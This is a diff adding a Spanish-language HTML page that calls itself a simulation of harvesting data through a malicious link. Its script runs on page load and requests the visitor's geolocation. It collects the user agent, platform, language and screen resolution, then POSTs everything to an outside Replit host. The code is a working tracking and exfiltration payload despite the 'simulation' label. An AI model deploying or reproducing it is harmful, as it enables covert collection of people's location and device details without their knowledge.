@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulación de Enlace</title>
+</head>
+<body>
+    <h1>Bienvenido a la simulación</h1>
+    <p>Esta es una demostración de cómo se pueden recolectar datos a través de un enlace malicioso.</p>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData);
+            } else {
+                sendData(null);
+            }
+        }
+
+        function sendData(position) {
+            let data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString()
+            };
+            
+            if (position) {
+                data.location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                };
+            } else {
+                data.location = null;
+            }
+
+            fetch('https://simulacionenlace.username.repl.co', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        }
+
+        getLocation();
+    </script>
+</body>
+</html>
